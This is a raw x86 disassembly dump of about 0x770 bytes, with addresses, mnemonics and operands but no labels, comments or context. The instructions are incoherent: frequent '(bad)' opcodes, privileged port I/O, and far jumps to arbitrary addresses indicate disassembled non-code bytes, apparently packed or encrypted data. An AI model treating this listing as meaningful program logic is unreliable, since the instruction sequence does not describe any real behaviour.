  40ee67:	mov    WORD PTR [ecx],es
  40ee69:	into   
  40ee6a:	rcr    BYTE PTR [edi+0x3d472b2f],cl
  40ee70:	lods   eax,DWORD PTR ds:[esi]
  40ee71:	add    edx,ebx
  40ee73:	cld    
  40ee74:	outs   dx,BYTE PTR ds:[esi]
  40ee75:	jmp    0xd73e:0x37fb570
  40ee7c:	mov    esp,0x27d6a4de
  40ee81:	sub    BYTE PTR [ecx+0x4f],bl
  40ee84:	call   0xc72e:0xe49290d8
  40ee8b:	xchg   esp,eax
  40ee8c:	aam    0xf6
  40ee8e:	fmul   DWORD PTR [ecx+0x52f543c8]
  40ee94:	into   
  40ee95:	test   BYTE PTR [ecx+0x37],0x7
  40ee99:	lea    ebp,[edi+0x482ebdb9]
  40ee9f:	xor    ch,BYTE PTR [ecx-0x5bc707a7]
  40eea5:	and    esp,0x39a667e2
  40eeab:	ins    BYTE PTR es:[edi],dx
  40eeac:	scas   eax,DWORD PTR es:[edi]
  40eead:	cdq    
  40eeae:	std    
  40eeaf:	adc    eax,0xd647ab5f
  40eeb4:	mov    ?,WORD PTR [ecx-0x16]
  40eeb7:	jns    0x40ef02
  40eeb9:	mov    edx,edx
  40eebb:	sbb    al,0x36
  40eebd:	pushf  
  40eebe:	mov    ch,0xcb
  40eec0:	retf   
  40eec1:	or     al,0xc9
  40eec3:	cmp    eax,0xf97d1c70
  40eec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eec9:	int    0x3d
  40eecb:	lods   al,BYTE PTR ds:[esi]
  40eecc:	or     eax,0x72848396
  40eed1:	cs cs es jb 0x40ee73
  40eed6:	icebp  
  40eed7:	mov    edx,0xca2f5c79
  40eedc:	fdivp  st(3),st
  40eede:	test   BYTE PTR [ebx-0x6],al
  40eee1:	jns    0x40ef46
  40eee3:	adc    al,0xce
  40eee5:	sub    BYTE PTR [eax-0x6c],dh
  40eee8:	shl    dh,cl
  40eeea:	adc    BYTE PTR [ecx+0xb],bh
  40eeed:	es jl  0x40ee99
  40eef0:	imul   BYTE PTR [edx+0x59]
  40eef3:	clc    
  40eef4:	shr    dl,1
  40eef6:	xor    al,0x5
  40eef8:	and    eax,0xcd8902ad
  40eefd:	xchg   DWORD PTR [ebp-0x2],eax
  40ef00:	mov    eax,0x3a2945f3
  40ef05:	out    dx,eax
  40ef06:	or     edx,0xffffffe0
  40ef09:	inc    eax
  40ef0a:	mov    ah,0xfd
  40ef0c:	popf   
  40ef0d:	xchg   esp,eax
  40ef0e:	xor    al,0x7
  40ef10:	sub    DWORD PTR [eax+eax*4],esi
  40ef13:	lahf   
  40ef14:	push   ds
  40ef15:	(bad)
  40ef19:	call   0xcdde:0x6a5939d5
  40ef20:	and    DWORD PTR [eax+0x70b444b0],ebp
  40ef26:	mov    edi,DWORD PTR [ebx+0x2c8fa074]
  40ef2c:	mov    ah,BYTE PTR [edx-0x47]
  40ef2f:	adc    eax,0x84e123f5
  40ef34:	sbb    al,0x38
  40ef36:	sti    
  40ef37:	push   ecx
  40ef38:	lods   eax,DWORD PTR ds:[esi]
  40ef39:	or     DWORD PTR [edx-0x4ce9d8e7],esi
  40ef3f:	fdiv   QWORD PTR [eax-0xcc95d70]
  40ef45:	adc    cl,dh
  40ef47:	xlat   BYTE PTR ds:[ebx]
  40ef48:	daa    
  40ef49:	jg     0x40ef8e
  40ef4b:	sub    al,BYTE PTR [eax-0x531084d2]
  40ef51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef52:	dec    edx
  40ef53:	mov    edi,?
  40ef55:	adc    DWORD PTR [ebx],esi
  40ef57:	je     0x40ef59
  40ef59:	lahf   
  40ef5a:	or     BYTE PTR [ebp+0x2915cd03],0x45
  40ef61:	jecxz  0x40ef34
  40ef63:	push   0xffffffa0
  40ef65:	pushf  
  40ef66:	inc    edx
  40ef67:	inc    ebp
  40ef68:	ins    DWORD PTR es:[edi],dx
  40ef69:	jmp    DWORD PTR [ebp+0x51a1c2be]
  40ef6f:	sbb    eax,DWORD PTR [edx+0x58]
  40ef72:	and    BYTE PTR [esi],dl
  40ef74:	mov    ds:0x6217bb97,eax
  40ef79:	(bad)  
  40ef7a:	jp     0x40ef93
  40ef7c:	sbb    al,0x49
  40ef7e:	ficomp WORD PTR [ebp+0x45]
  40ef81:	jg     0x40efca
  40ef83:	pop    ebx
  40ef84:	test   DWORD PTR [ebp-0x5c978e16],ecx
  40ef8a:	cld    
  40ef8b:	test   ebx,eax
  40ef8d:	loope  0x40ef62
  40ef8f:	stc    
  40ef90:	sbb    ch,dh
  40ef92:	fcmovnb st,st(6)
  40ef94:	sbb    eax,DWORD PTR [edi+esi*8]
  40ef97:	push   esi
  40ef98:	test   DWORD PTR [edi+0x3f9738a4],esp
  40ef9e:	out    0xb7,eax
  40efa0:	inc    ebp
  40efa1:	jp     0x40ef29
  40efa3:	cmp    al,0xeb
  40efa5:	es pop esi
  40efa7:	(bad)  
  40efa8:	push   edx
  40efa9:	ss stc 
  40efab:	sbb    BYTE PTR [eax-0x567f43cb],al
  40efb1:	sbb    DWORD PTR [edx],ebx
  40efb3:	pop    edi
  40efb4:	icebp  
  40efb5:	xchg   DWORD PTR [ebp+0x4a862dc1],edx
  40efbb:	pop    ds
  40efbc:	xchg   DWORD PTR [ebx],edx
  40efbe:	(bad)  
  40efbf:	call   DWORD PTR [esp+ecx*8+0x32]
  40efc3:	mov    ch,0xd1
  40efc5:	xor    esp,eax
  40efc7:	add    ebx,esp
  40efc9:	icebp  
  40efca:	jle    0x40f017
  40efcc:	(bad)  
  40efcd:	mov    esi,0xcd46bce6
  40efd2:	cli    
  40efd3:	xchg   edi,eax
  40efd4:	sahf   
  40efd5:	pop    ecx
  40efd6:	mov    esp,0x72e2dd68
  40efdb:	pushf  
  40efdc:	push   esp
  40efdd:	pusha  
  40efde:	out    dx,eax
  40efdf:	add    edx,DWORD PTR fs:[ecx+0x63]
  40efe3:	(bad)  
  40efe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efe5:	and    eax,0xdab8b8d2
  40efea:	xchg   bh,al
  40efec:	enter  0x1c34,0x24
  40eff0:	push   ecx
  40eff1:	pop    esi
  40eff2:	aam    0x39
  40eff4:	ret    
  40eff5:	cmc    
  40eff6:	jl     0x40efb2
  40eff8:	and    BYTE PTR [eax+edx*1],ch
  40effb:	adc    DWORD PTR [eax-0x35edca17],ebx
  40f001:	push   0xffffff9b
  40f003:	fcomp  st(0)
  40f005:	jne    0x40f064
  40f007:	and    eax,0xbefad87
  40f00c:	ss sub al,0x86
  40f00f:	ins    DWORD PTR es:[edi],dx
  40f010:	pop    ss
  40f011:	xchg   ecx,eax
  40f012:	jnp    0x40efda
  40f014:	cmc    
  40f015:	scas   al,BYTE PTR es:[edi]
  40f016:	fldlg2 
  40f018:	xchg   esi,eax
  40f019:	mov    dh,0x48
  40f01b:	sub    BYTE PTR [ebx+ebp*8],0xc0
  40f01f:	inc    eax
  40f020:	mov    BYTE PTR [edx+0x13a42dae],bl
  40f026:	push   ebx
  40f027:	sbb    al,BYTE PTR [esi]
  40f029:	test   al,0x5a
  40f02b:	repnz inc edx
  40f02d:	das    
  40f02e:	inc    eax
  40f02f:	rcr    BYTE PTR [edx-0x1b],1
  40f032:	jno    0x40f029
  40f034:	fsub   st(4),st
  40f036:	popf   
  40f037:	sbb    esp,DWORD PTR [edx]
  40f039:	jle    0x40efed
  40f03b:	pushf  
  40f03c:	mov    esi,0x92c5f745
  40f041:	xor    bh,cl
  40f043:	xbegin 0x852542fb
  40f049:	dec    esi
  40f04a:	in     al,0x1
  40f04c:	or     eax,0x5e
  40f04f:	sub    DWORD PTR [esp+ebp*4+0x52],0xffffff8f
  40f054:	pop    ss
  40f055:	cmp    DWORD PTR [eax+edx*2-0x5145b2f7],ebx
  40f05c:	scas   eax,DWORD PTR es:[edi]
  40f05d:	xor    dl,BYTE PTR [esi-0x17]
  40f060:	or     bh,bl
  40f062:	leave  
  40f063:	jl     0x40f04a
  40f065:	jnp    0x40f008
  40f067:	lods   al,BYTE PTR ds:[esi]
  40f068:	mov    dh,0x3c
  40f06a:	adc    dh,cl
  40f06c:	add    eax,0xce8a597e
  40f071:	xchg   DWORD PTR [edi-0x21],esp
  40f074:	les    edi,FWORD PTR [edx+0x4a5f38a]
  40f07a:	call   0x221fe6d2
  40f07f:	sbb    ecx,esi
  40f081:	mov    esi,0xd6f53fd4
  40f086:	adc    DWORD PTR [eax+0x35fe2ce2],edx
  40f08c:	mov    esp,0x636950fe
  40f091:	dec    eax
  40f092:	mov    dh,0xa0
  40f094:	in     eax,0x29
  40f096:	popa   
  40f097:	retf   0xcdda
  40f09a:	adc    DWORD PTR [ebx],0xfaf2008c
  40f0a0:	push   ss
  40f0a1:	inc    esi
  40f0a2:	(bad)  
  40f0a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0a4:	cmp    BYTE PTR [edx],cl
  40f0a6:	and    esi,ebp
  40f0a8:	push   esp
  40f0a9:	push   0x76
  40f0ab:	push   ebp
  40f0ac:	ds sahf 
  40f0ae:	push   ecx
  40f0af:	lock sbb eax,0xa0219a2d
  40f0b5:	cdq    
  40f0b6:	js     0x40f0d4
  40f0b8:	fnstcw WORD PTR [ebx]
  40f0ba:	repz dec ecx
  40f0bc:	or     DWORD PTR [edx],ebx
  40f0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0bf:	push   ds
  40f0c0:	les    ebp,FWORD PTR [edx+0x3078eca]
  40f0c6:	stc    
  40f0c7:	lods   al,BYTE PTR ds:[esi]
  40f0c8:	data16 mov dl,0xae
  40f0cb:	xor    edx,DWORD PTR [ebp-0x45cfcddc]
  40f0d1:	or     DWORD PTR [ecx+0x57],ebp
  40f0d4:	sub    eax,0xcce8fe2a
  40f0d9:	and    BYTE PTR [esi+0x49d1ae85],bh
  40f0df:	push   cs
  40f0e0:	sbb    DWORD PTR [eax-0x5c16c8ea],eax
  40f0e6:	sub    eax,0xa2b353c8
  40f0eb:	sub    al,0x2b
  40f0ed:	bound  ecx,QWORD PTR [edi-0x5fbf4b70]
  40f0f3:	sbb    al,0xc4
  40f0f5:	imul   esi,edx,0x828e4142
  40f0fb:	inc    ecx
  40f0fc:	xor    ebx,edi
  40f0fe:	nop
  40f0ff:	push   0xa0474722
  40f104:	sub    al,0xe2
  40f106:	les    edx,FWORD PTR [ecx]
  40f108:	cmc    
  40f109:	cmp    BYTE PTR [edi],ah
  40f10b:	dec    BYTE PTR [ecx]
  40f10d:	mov    ebx,0xa8edd009
  40f112:	push   esp
  40f113:	leave  
  40f114:	outs   dx,DWORD PTR ds:[esi]
  40f115:	push   cs
  40f116:	das    
  40f117:	mul    BYTE PTR [ebx-0x6490ae7c]
  40f11d:	and    DWORD PTR ds:[ebx],esp
  40f120:	scas   eax,DWORD PTR es:[edi]
  40f121:	lahf   
  40f122:	and    BYTE PTR [ebx],dh
  40f124:	ror    DWORD PTR [edx+0x2],1
  40f127:	arpl   bp,sp
  40f129:	popa   
  40f12a:	jle    0x40f101
  40f12c:	jae    0x40f19d
  40f12e:	pop    ecx
  40f12f:	mov    DWORD PTR [eax+0x72],eax
  40f132:	sub    edi,ebp
  40f134:	aam    0xd4
  40f136:	jle    0x40f103
  40f138:	sbb    BYTE PTR [ecx-0x10219168],ch
  40f13e:	jge    0x40f13a
  40f140:	ins    BYTE PTR es:[edi],dx
  40f141:	push   0x6d097d94
  40f146:	test   al,0x4
  40f148:	jl     0x40f0fa
  40f14a:	mov    al,dh
  40f14c:	pop    esi
  40f14d:	int    0x5b
  40f14f:	mov    al,0x16
  40f151:	jp     0x40f182
  40f153:	pop    ebx
  40f154:	dec    ebp
  40f155:	mov    esi,0x8c5e7bd0
  40f15a:	mov    eax,0x3af9cfa7
  40f15f:	mov    eax,ds:0x56410997
  40f164:	test   BYTE PTR [eax],ch
  40f166:	call   0xcdfb87d2
  40f16b:	enter  0xb45b,0x7f
  40f16f:	pop    es
  40f170:	retf   0x4352
  40f173:	out    0x22,eax
  40f175:	out    0x42,eax
  40f177:	push   cs
  40f178:	xor    eax,0x2f8137fe
  40f17d:	fadd   st,st(3)
  40f17f:	(bad)  
  40f180:	scas   al,BYTE PTR es:[edi]
  40f181:	xlat   BYTE PTR ds:[ebx]
  40f182:	xlat   BYTE PTR ds:[ebx]
  40f183:	bound  ecx,QWORD PTR [eax-0x4f72e38b]
  40f189:	jno    0x40f14e
  40f18b:	xor    ebp,DWORD PTR [esi+0x69]
  40f18e:	pop    es
  40f18f:	cmp    al,0x88
  40f191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f192:	mov    al,0x33
  40f194:	mov    bh,0x9b
  40f196:	scas   eax,DWORD PTR es:[edi]
  40f197:	mov    edx,0x15b8b1cd
  40f19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f19d:	sub    ch,BYTE PTR [edi]
  40f19f:	imul   esi,DWORD PTR [edx-0x69dc2c17],0x67707c61
  40f1a9:	mov    dl,0xe0
  40f1ab:	std    
  40f1ac:	addr16 jns 0x40f18d
  40f1af:	outs   dx,BYTE PTR ds:[esi]
  40f1b0:	not    DWORD PTR [ebx]
  40f1b2:	bswap  ebp
  40f1b4:	and    DWORD PTR [edi+0x76],esi
  40f1b7:	sbb    DWORD PTR [edx-0x4b99db4c],edx
  40f1bd:	or     al,0x4d
  40f1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1c0:	sbb    BYTE PTR [edx+0x3d86b9e0],dh
  40f1c6:	and    ecx,DWORD PTR [eax-0x6f7d30ec]
  40f1cc:	push   ss
  40f1cd:	mov    bh,0x6b
  40f1cf:	loopne 0x40f201
  40f1d1:	sbb    esi,0x9b8dc4c4
  40f1d7:	ins    BYTE PTR es:[edi],dx
  40f1d8:	sbb    ebp,eax
  40f1da:	jle    0x40f1f0
  40f1dc:	sbb    al,0xc6
  40f1de:	fld    TBYTE PTR [esi]
  40f1e0:	pop    eax
  40f1e1:	add    DWORD PTR [edx],eax
  40f1e3:	add    al,0x4e
  40f1e5:	stc    
  40f1e6:	jg     0x40f176
  40f1e8:	sub    al,0x2b
  40f1ea:	inc    esp
  40f1eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ec:	rcl    BYTE PTR [eax],0x44
  40f1ef:	xor    DWORD PTR [eax],esp
  40f1f1:	(bad)  
  40f1f2:	pop    ecx
  40f1f3:	cmp    al,0x9d
  40f1f5:	jo     0x40f1ae
  40f1f7:	mov    WORD PTR [ecx+edi*2-0x2a],gs
  40f1fb:	mov    ch,0x2d
  40f1fd:	mov    WORD PTR [edx-0x1e],cs
  40f200:	gs pop eax
  40f202:	push   edx
  40f203:	lds    edx,FWORD PTR [eax]
  40f205:	rol    BYTE PTR fs:[esi-0x4534dfec],1
  40f20c:	jo     0x40f1bc
  40f20e:	lods   al,BYTE PTR ds:[esi]
  40f20f:	xchg   ecx,eax
  40f210:	xor    BYTE PTR [ecx-0x4e],bh
  40f213:	add    ebx,DWORD PTR ds:0x3413461b
  40f219:	jle    0x40f265
  40f21b:	imul   BYTE PTR [eax+0xb]
  40f21e:	or     BYTE PTR [esi-0x6a],dl
  40f221:	push   ds
  40f222:	cwde   
  40f223:	popf   
  40f224:	mov    ebp,0x617692e
  40f229:	gs push esp
  40f22b:	leave  
  40f22c:	xchg   esp,eax
  40f22d:	xchg   edx,eax
  40f22e:	enter  0x781b,0xef
  40f232:	mov    BYTE PTR [ebx-0x788e75e8],0x47
  40f239:	push   ebp
  40f23a:	mov    dh,0x47
  40f23c:	aad    0x1e
  40f23e:	das    
  40f23f:	shl    BYTE PTR [esi+0x6dfe5b8c],0x19
  40f246:	pop    esp
  40f247:	xor    ch,ah
  40f249:	dec    esp
  40f24a:	jge    0x40f2bb
  40f24c:	call   0x5e89:0x32aa8dae
  40f253:	cmp    ah,BYTE PTR [edi+0x4]
  40f256:	adc    DWORD PTR [edi+0x1e],ecx
  40f259:	mov    eax,ds:0xa6c21833
  40f25e:	(bad)  
  40f25f:	test   BYTE PTR [ebx-0x35],0x23
  40f263:	shr    BYTE PTR [esi],cl
  40f265:	aaa    
  40f266:	ror    DWORD PTR ds:0xc18006b6,0xcc
  40f26d:	pop    es
  40f26e:	mov    ecx,0x41d00d9e
  40f273:	jg     0x40f220
  40f275:	inc    esi
  40f276:	test   BYTE PTR [eax],al
  40f278:	scas   eax,DWORD PTR es:[edi]
  40f279:	add    esi,DWORD PTR [eax-0x7e46c66c]
  40f27f:	outs   dx,BYTE PTR ds:[esi]
  40f280:	pop    esp
  40f281:	or     eax,0xf4330cdf
  40f286:	pusha  
  40f287:	fld    DWORD PTR [edx+esi*2+0x30]
  40f28b:	bound  eax,QWORD PTR [ecx-0x4d]
  40f28e:	mov    bl,0xba
  40f290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f291:	xchg   esi,eax
  40f292:	pop    esi
  40f293:	test   BYTE PTR [ecx+0x3e],dl
  40f296:	xchg   esi,eax
  40f297:	sub    ecx,ebx
  40f299:	sub    ebp,DWORD PTR [edx+0xa]
  40f29c:	pop    ecx
  40f29d:	rep ins DWORD PTR es:[edi],dx
  40f29f:	arpl   cx,bx
  40f2a1:	mov    ah,0xae
  40f2a3:	int    0x96
  40f2a5:	add    eax,0x2464bf
  40f2aa:	pop    edi
  40f2ab:	call   DWORD PTR [ecx*2+0xce0e411]
  40f2b2:	xchg   ebp,eax
  40f2b3:	inc    ecx
  40f2b4:	pop    eax
  40f2b5:	mov    ds:0x543a48c7,al
  40f2ba:	jne    0x40f281
  40f2bc:	sbb    DWORD PTR [ebp+0x51],0x798f57a4
  40f2c3:	repz mov edi,0xdd8a72a3
  40f2c9:	js     0x40f24b
  40f2cb:	int3   
  40f2cc:	mov    edx,0x7d9db775
  40f2d1:	popf   
  40f2d2:	jb     0x40f28b
  40f2d4:	ret    
  40f2d5:	retf   
  40f2d6:	sahf   
  40f2d7:	test   DWORD PTR [ecx],ebp
  40f2d9:	xchg   al,al
  40f2db:	aas    
  40f2dc:	outs   dx,DWORD PTR ds:[esi]
  40f2dd:	scas   al,BYTE PTR es:[edi]
  40f2de:	jb     0x40f33e
  40f2e0:	xchg   edx,eax
  40f2e1:	sbb    eax,0x26eca438
  40f2e6:	(bad)  
  40f2e7:	in     eax,0x61
  40f2e9:	mov    ah,0xf2
  40f2eb:	loopne 0x40f284
  40f2ed:	vpaddq ymm0,ymm2,YMMWORD PTR [edi-0x58bc5ff]
  40f2f5:	or     eax,0x50e72e43
  40f2fa:	push   ebx
  40f2fb:	pop    edi
  40f2fc:	jnp    0x40f2c2
  40f2fe:	repz fsubp st(7),st
  40f301:	(bad)  
  40f302:	mov    cl,0xa3
  40f304:	and    al,0xb5
  40f306:	inc    edi
  40f307:	outs   dx,DWORD PTR ds:[esi]
  40f308:	inc    ecx
  40f309:	pop    di
  40f30b:	dec    ebx
  40f30c:	ret    
  40f30d:	ins    BYTE PTR es:[edi],dx
  40f30e:	lods   eax,DWORD PTR ds:[esi]
  40f30f:	xor    DWORD PTR [edx],esp
  40f311:	adc    ebp,DWORD PTR [esi+0x13]
  40f314:	push   ebp
  40f315:	lock pop ss
  40f317:	adc    BYTE PTR [esi],0xbb
  40f31a:	add    edi,DWORD PTR [ecx+0x5707c887]
  40f320:	jno    0x40f39d
  40f322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f323:	mov    esi,0xcf0c59a8
  40f328:	fstp   QWORD PTR [edx+0x2077a02e]
  40f32e:	sbb    BYTE PTR [bp+di+0x580d],ch
  40f333:	daa    
  40f334:	xchg   BYTE PTR [edi],ah
  40f336:	push   es
  40f337:	xchg   ebx,eax
  40f338:	shl    DWORD PTR [ecx+0x6aa8e0c0],0x9
  40f33f:	adc    esi,eax
  40f341:	and    al,0x91
  40f343:	je     0x40f378
  40f345:	test   al,0x34
  40f347:	popf   
  40f348:	xchg   edx,eax
  40f349:	add    al,0x20
  40f34b:	mov    ds:0xc85e3424,al
  40f350:	in     al,dx
  40f351:	popa   
  40f352:	or     BYTE PTR [ebx],bl
  40f354:	jo     0x40f3c7
  40f356:	test   BYTE PTR [ecx],ch
  40f358:	(bad)  [ecx+ebx*2-0x23]
  40f35c:	arpl   WORD PTR [esi+edi*4-0x15],dx
  40f360:	rol    DWORD PTR [ecx],1
  40f362:	mov    edx,0x22114860
  40f367:	jl     0x40f326
  40f369:	into   
  40f36a:	ss jae 0x40f39b
  40f36d:	mov    al,0x76
  40f36f:	mov    bl,BYTE PTR [edi+ebp*2-0x27b410b9]
  40f376:	mov    edi,0x9ed8cacb
  40f37b:	cmp    eax,0xe948a5af
  40f380:	sbb    al,0x98
  40f382:	test   al,0x9d
  40f384:	nop
  40f385:	pop    ds
  40f386:	mov    WORD PTR [eax],es
  40f388:	lds    ebx,FWORD PTR [ecx]
  40f38a:	xchg   ebx,eax
  40f38b:	loop   0x40f373
  40f38d:	cli    
  40f38e:	jmp    0x40f325
  40f390:	(bad)  
  40f391:	pop    ecx
  40f392:	repz push ebp
  40f394:	cwde   
  40f395:	aaa    
  40f396:	outs   dx,DWORD PTR ds:[esi]
  40f397:	mov    bh,0xeb
  40f399:	dec    edx
  40f39a:	xor    esp,DWORD PTR [eax+0x7e0cbd34]
  40f3a0:	push   0xffffffc1
  40f3a2:	dec    ebx
  40f3a3:	push   0xffffff80
  40f3a5:	dec    edx
  40f3a6:	add    ecx,0xf539ff9b
  40f3ac:	pusha  
  40f3ad:	mov    BYTE PTR [ebx-0x504593c],bh
  40f3b3:	jne    0x40f40a
  40f3b5:	push   cs
  40f3b6:	pop    ebp
  40f3b7:	jne    0x40f42a
  40f3b9:	or     al,BYTE PTR [ebp-0x51bbfb1b]
  40f3bf:	iret   
  40f3c0:	or     ecx,DWORD PTR [esi+0x54]
  40f3c3:	xor    DWORD PTR [eax+0x365e2c11],0xaec03394
  40f3cd:	jno    0x40f3a8
  40f3cf:	lods   eax,DWORD PTR ds:[esi]
  40f3d0:	test   ebx,esp
  40f3d2:	sbb    al,0x8
  40f3d4:	pop    ecx
  40f3d5:	(bad)  
  40f3d6:	mov    esp,0x8a80d5bd
  40f3db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3dc:	mov    ch,0x19
  40f3de:	lock rol BYTE PTR fs:[ecx+0x6f],0x5f
  40f3e4:	pop    esp
  40f3e5:	aas    
  40f3e6:	cli    
  40f3e7:	lahf   
  40f3e8:	jle    0x40f3fa
  40f3ea:	data16 aam 0xa9
  40f3ed:	cmp    al,0x8f
  40f3ef:	push   0x28
  40f3f1:	jl     0x40f3b9
  40f3f3:	jae    0x40f3da
  40f3f5:	mov    edi,0x8447b4be
  40f3fa:	in     al,dx
  40f3fb:	fwait
  40f3fc:	popa   
  40f3fd:	xchg   edx,edx
  40f3ff:	lea    ebx,[edi+esi*4]
  40f402:	mov    ss:0x8d88d27c,eax
  40f408:	push   ss
  40f409:	pop    esi
  40f40a:	jmp    0x22e1fe28
  40f40f:	mov    al,ds:0xcfd8956a
  40f414:	iret   
  40f415:	test   al,0x49
  40f417:	dec    esi
  40f418:	je     0x40f44c
  40f41a:	jp     0x40f3d2
  40f41c:	pop    ecx
  40f41d:	retf   0xddb9
  40f420:	or     BYTE PTR [ebx+0x10],ch
  40f423:	pop    ebp
  40f424:	mov    edi,0xe2d654d4
  40f429:	pop    ebx
  40f42a:	jl     0x40f41f
  40f42c:	outs   dx,DWORD PTR ds:[esi]
  40f42d:	jmp    0x40f3cf
  40f42f:	xchg   ebp,eax
  40f430:	xchg   ecx,eax
  40f431:	cmp    eax,0xbaf878aa
  40f436:	test   al,0xed
  40f438:	and    DWORD PTR [esp+esi*2],esp
  40f43b:	and    eax,0x7ae15e40
  40f440:	mov    ds:0x32ea92f3,eax
  40f445:	cli    
  40f446:	and    eax,0x1dac6d12
  40f44b:	pop    edx
  40f44c:	fs nop
  40f44e:	call   0x114541e1
  40f453:	int3   
  40f454:	add    ah,al
  40f456:	mov    WORD PTR [ebp-0x26],cs
  40f459:	cmp    al,0x34
  40f45b:	ret    
  40f45c:	xchg   ebx,eax
  40f45d:	imul   ecx,ecx,0xffffff82
  40f460:	rcr    eax,0x41
  40f463:	or     eax,DWORD PTR [edi+0x4f550f1e]
  40f469:	mov    esi,0x50d0df35
  40f46e:	add    al,0x65
  40f470:	mov    cl,ah
  40f472:	push   0x5e
  40f474:	mov    cl,0xfe
  40f476:	add    eax,0x2bd44d2b
  40f47b:	push   ds
  40f47c:	pop    eax
  40f47d:	ss popa 
  40f47f:	enter  0xe549,0xd3
  40f483:	jp     0x40f45e
  40f485:	ss lock mov bh,0x91
  40f489:	shr    BYTE PTR [ecx+0x42d00293],cl
  40f48f:	sub    DWORD PTR [eax],esp
  40f491:	sbb    eax,0x5b1dab56
  40f496:	and    DWORD PTR [eax],ebp
  40f498:	and    al,0xa8
  40f49a:	(bad)  
  40f49b:	jg     0x40f45c
  40f49d:	mov    al,0x11
  40f49f:	or     BYTE PTR [edi-0x72100ab6],ah
  40f4a5:	mov    edx,0x2263307e
  40f4aa:	test   DWORD PTR [edi],ebp
  40f4ac:	ins    BYTE PTR es:[edi],dx
  40f4ad:	adc    dl,BYTE PTR [esi-0x65]
  40f4b0:	sbb    BYTE PTR [ebp-0x73860f68],dl
  40f4b6:	(bad)  
  40f4b7:	sbb    BYTE PTR [eax-0xd],al
  40f4ba:	popa   
  40f4bb:	jbe    0x40f4bc
  40f4bd:	push   ecx
  40f4be:	sub    al,0x4b
  40f4c0:	fdivr  QWORD PTR [eax]
  40f4c2:	aas    
  40f4c3:	dec    eax
  40f4c4:	jno    0x40f538
  40f4c6:	cmp    eax,0x5c528d5
  40f4cb:	sub    eax,0x8bc1e205
  40f4d0:	imul   ebx,DWORD PTR [ebx-0x55],0x5c
  40f4d4:	retf   0xd498
  40f4d7:	lods   al,BYTE PTR ds:[esi]
  40f4d8:	mov    fs,WORD PTR [eax-0x312f5d68]
  40f4de:	push   ss
  40f4df:	or     al,0x9e
  40f4e1:	lock (bad) 
  40f4e3:	push   eax
  40f4e4:	sub    DWORD PTR [ecx-0x1ffc5e72],eax
  40f4ea:	loopne 0x40f521
  40f4ec:	sahf   
  40f4ed:	pop    ebx
  40f4ee:	pusha  
  40f4ef:	fsub   st(2),st
  40f4f1:	sbb    BYTE PTR [edi],dl
  40f4f3:	inc    edx
  40f4f4:	arpl   WORD PTR [ebx],cx
  40f4f6:	xor    ebx,DWORD PTR [ebp+0x7f4099aa]
  40f4fc:	std    
  40f4fd:	push   esi
  40f4fe:	test   al,0xe4
  40f500:	imul   esp,esp,0xffffffe0
  40f503:	pop    es
  40f504:	jmp    0x1189:0x73d835b8
  40f50b:	(bad)  
  40f50c:	xchg   esi,eax
  40f50d:	xacquire xchg BYTE PTR [edi-0x72],al
  40f511:	aad    0xa9
  40f513:	mov    edx,edx
  40f515:	dec    ebx
  40f516:	xchg   DWORD PTR [ecx-0x1581a7d5],ebp
  40f51c:	mov    ds:0xfca5c2ca,al
  40f521:	enter  0xf887,0x94
  40f525:	xor    ebp,DWORD PTR [ecx]
  40f527:	sub    cl,bh
  40f529:	jmp    0x40f556
  40f52b:	fadd   QWORD PTR [edx+0x5729885b]
  40f531:	sbb    eax,0x18646107
  40f536:	xor    esi,DWORD PTR [ecx-0x460dd7ba]
  40f53c:	dec    eax
  40f53d:	xor    BYTE PTR [eax+edx*8],ch
  40f540:	and    ebp,DWORD PTR [edx]
  40f542:	das    
  40f543:	out    dx,al
  40f544:	cdq    
  40f545:	loopne 0x40f4fd
  40f547:	push   0x5cbb3ab4
  40f54c:	nop
  40f54d:	sub    edx,edi
  40f54f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f550:	out    0x52,al
  40f552:	xchg   edx,eax
  40f553:	cmp    eax,0x2f4f47
  40f558:	mov    eax,0xac578282
  40f55d:	push   edx
  40f55e:	shl    DWORD PTR [edi+0x3291d71c],cl
  40f564:	cdq    
  40f565:	add    DWORD PTR [edi+0x35],ecx
  40f568:	out    dx,eax
  40f569:	sub    DWORD PTR [ebx],0x6d
  40f56c:	sbb    DWORD PTR [ecx+0xd673b74],edi
  40f572:	mov    bl,0xa6
  40f574:	call   0x31bb6dda
  40f579:	js     0x40f563
  40f57b:	add    eax,0x38d87607
  40f580:	paddd  mm6,mm1
  40f583:	rcr    DWORD PTR [edx+ebp*4+0x3d],0x79
  40f588:	xor    BYTE PTR [edi],ah
  40f58a:	out    dx,al
  40f58b:	add    edi,ebx
  40f58d:	add    edi,DWORD PTR [esi]
  40f58f:	test   DWORD PTR [ebx-0x2820ab11],edi
  40f595:	inc    eax
  40f596:	adc    eax,esp
  40f598:	int3   
  40f599:	sti    
  40f59a:	pop    DWORD PTR [esi+esi*2]
  40f59d:	and    DWORD PTR [edx-0x14ca8c2f],0xdd907c22
  40f5a7:	sub    al,0x8c
  40f5a9:	push   edx
  40f5aa:	mov    ds:0x45151c37,eax
  40f5af:	and    esi,ebp
  40f5b1:	or     al,0xeb
  40f5b3:	or     DWORD PTR [esi],ecx
  40f5b5:	cmp    BYTE PTR [eax+ecx*2-0x33],dl
  40f5b9:	jnp    0x40f53e
  40f5bb:	jecxz  0x40f566
  40f5bd:	bswap  ebx
  40f5bf:	push   esp
  40f5c0:	das    
  40f5c1:	push   esi
  40f5c2:	dec    ecx
  40f5c3:	imul   esp,DWORD PTR ds:0x8fb949be,0x57
  40f5ca:	dec    ecx
  40f5cb:	sar    BYTE PTR [eax],0x6a
  40f5ce:	push   edx
  40f5cf:	rcl    BYTE PTR [edx+0x6b0f9915],0x65
